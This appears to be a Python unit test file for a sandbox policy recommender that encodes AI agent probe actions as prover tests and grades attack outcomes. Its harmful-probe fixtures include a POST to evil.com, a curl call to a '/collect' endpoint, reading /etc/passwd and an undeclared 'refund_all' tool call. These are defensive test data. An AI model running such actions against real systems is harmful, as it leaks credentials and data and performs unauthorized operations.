"""Unit tests for prove.py (action -> prover test encoding) and bundle.py (attack outcome)."""
import json

from openshell_recommender import bundle, prove  # noqa: E402

POLICY = {
    "version": 1,
    "process": {"run_as_user": "1500", "run_as_group": "1500"},
    "filesystem_policy": {"include_workdir": True, "read_only": ["/usr"], "read_write": ["/sandbox/workdir"]},
    "network_policies": {
        "mcp_tools": {"endpoints": [{"host": "h", "port": 8765, "protocol": "mcp"}], "binaries": [{"path": "/x"}]},
        "model": {"endpoints": [{"host": "h", "port": 11434}], "binaries": [{"path": "/y"}]},
    },
}


def probe(kind, action, effect="e"):
    return {"probe_id": "p", "kind": kind, "threat_id": "T2", "effect": effect, "action": action}


def test_prover_copy_strips_mcp_and_workdir():
    p, notes = prove.prover_copy(POLICY)
    assert "mcp_tools" not in p["network_policies"] and "model" in p["network_policies"]
    assert p["filesystem_policy"]["include_workdir"] is False
    assert len(notes) == 2
    assert "mcp_tools" in POLICY["network_policies"]  # original untouched


def test_http_fetch_becomes_rest_network_test():
    t = prove.test_from_probe(probe("harmful", {"type": "http_fetch", "url": "https://evil.com/x", "method": "post"}))
    assert t["domain"] == "network" and t["expect"] == "blocked"
    assert t["net"] == {"binary": prove.BINARY_PATHS["ws"], "host": "evil.com", "port": 443, "method": "POST", "path": "/x"}
    ep = prove.tiny_policy(t, POLICY)["network_policies"]["test"]["endpoints"][0]
    assert ep["protocol"] == "rest" and ep["rules"][0]["allow"]["method"] == "POST"


def test_curl_command_becomes_l4_test_with_curl_binary():
    t = prove.test_from_probe(probe("harmful", {"type": "run_command", "command": "curl -s http://h:9102/collect"}))
    assert t["net"]["binary"] == "/usr/bin/curl" and t["net"]["port"] == 9102 and t["net"]["method"] is None


def test_local_command_and_mcp_not_provable():
    assert prove.test_from_probe(probe("harmful", {"type": "run_command", "command": "cat /etc/passwd"}))["not_provable"]
    assert prove.test_from_probe(probe("benign", {"type": "mcp_call", "name": "lookup_order"}))["not_provable"]


def test_fs_read_uses_covering_read_write_entry():
    t = prove.test_from_probe(probe("benign", {"type": "read_file", "path": "/sandbox/workdir/n.txt"}))
    fs = prove.tiny_policy(t, POLICY)["filesystem_policy"]
    assert fs["read_only"] == ["/sandbox/workdir"]


def test_verdicts():
    good = {"expect": "allowed"}
    bad = {"expect": "blocked"}
    assert prove.verdict(good, {"result": "within_boundary"})[0] == "pass"
    assert prove.verdict(bad, {"result": "within_boundary"})[0] == "fail"
    assert prove.verdict(bad, {"result": "exceeds_boundary", "counterexample": {"domain": "network", "host": "e"}})[0] == "pass"
    assert prove.verdict(bad, {"result": "unsupported", "reason": "x"})[0] == "not_provable"


def test_attack_outcome():
    assert bundle.attack_outcome(["denied", "denied"]) == "blocked"
    assert bundle.attack_outcome(["denied", "allowed"]) == "exposed"
    assert bundle.attack_outcome(["gap"]) == "content_only"
    assert bundle.attack_outcome(["denied", "gap"]) == "blocked"


def test_bundle_reads_recommended_dir_as_recommended_condition(tmp_path):
    # The CLI's `test` writes the recommended policy's results to <variant>/recommended/ (not least-privilege/).
    variant = "refunds"
    manifest = tmp_path / "manifest.yaml"
    manifest.write_text(json.dumps({"variant": variant, "agent": "fixture"}))  # JSON is valid YAML
    policy_dir = tmp_path / "policy"
    policy_dir.mkdir()
    (policy_dir / "policy.yaml").write_text(json.dumps(POLICY))
    plans = tmp_path / "probes.json"
    plans.write_text(json.dumps({"probes": [{
        "probe_id": "bad-1", "kind": "harmful", "threat_id": "T2", "effect": "call_undeclared_tool",
        "action": {"type": "mcp_call", "name": "refund_all"}, "scenario_id": "check:bad", "source": "fixture"}]}))
    tags = tmp_path / "tags.json"
    tags.write_text(json.dumps([{"scenario_id": "check:bad", "effects": []}]))
    results = tmp_path / "results"
    (results / variant / "recommended").mkdir(parents=True)
    (results / variant / "recommended" / "probes.jsonl").write_text(json.dumps({"probe_id": "bad-1", "status": "denied"}) + "\n")
    out = tmp_path / "out"
    prove_dir = tmp_path / "prove"
    prove_dir.mkdir()

    rc = bundle.main(["--manifest", str(manifest), "--policy-dir", str(policy_dir), "--tags", str(tags),
                      "--plans", str(plans), "--results", str(results), "--prove", str(prove_dir), "--out", str(out)])

    assert rc == 0
    test_row = json.loads((out / "tests.json").read_text())["tests"][0]
    assert test_row["recommended"] == "denied"
    attack = json.loads((out / "gaps.json").read_text())["attacks"][0]
    assert attack["recommended"] == "blocked"
    assert attack["blocked_by"] == ["network / MCP: MCP tools/call allowed only for the use case's declared tools"]
